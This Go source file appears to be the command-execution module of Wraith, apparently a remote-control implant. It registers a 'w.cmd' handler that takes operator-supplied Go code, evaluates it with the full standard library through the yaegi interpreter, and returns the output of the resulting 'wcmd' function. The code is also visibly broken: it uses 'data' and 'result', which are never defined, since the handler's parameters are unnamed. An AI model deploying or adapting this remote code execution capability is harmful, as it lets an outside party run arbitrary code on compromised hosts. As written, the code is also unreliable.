package parts

import (
	"fmt"

	"github.com/0x1a8510f2/wraith/proto"

	"github.com/traefik/yaegi/interp"
	"github.com/traefik/yaegi/stdlib"
)

func init() {
	proto.PartMap.Add("w.cmd", func(*proto.HandlerKeyValueStore, interface{}) {
		// Always catch panics from this function as no error here should crash Wraith
		defer func() {
			if r := recover(); r != nil {
				result = fmt.Sprintf("command execution panicked with message: %s", r)
			}
		}()

		if cmd, ok := data["w.cmd"]; ok {
			// Initialise yaegi to handle commands
			i := interp.New(interp.Options{})
			i.Use(stdlib.Symbols)
			// The code should generate a function called "wcmd" to be executed by Wraith.
			// That function should in turn return a string to be used as the result.
			// If the value of the key cmd is not a string, the panic will be caught and
			// returned as the command result.
			_, err := i.Eval(cmd.(string))
			if err != nil {
				panic(err)
			}
			fnv, err := i.Eval("wcmd")
			if err != nil {
				panic(err)
			}
			fn, ok := fnv.Interface().(func() string)
			if !ok {
				panic("wcmd is not a `func() string`")
			}
			result = fn()
		}
		return
	})
}
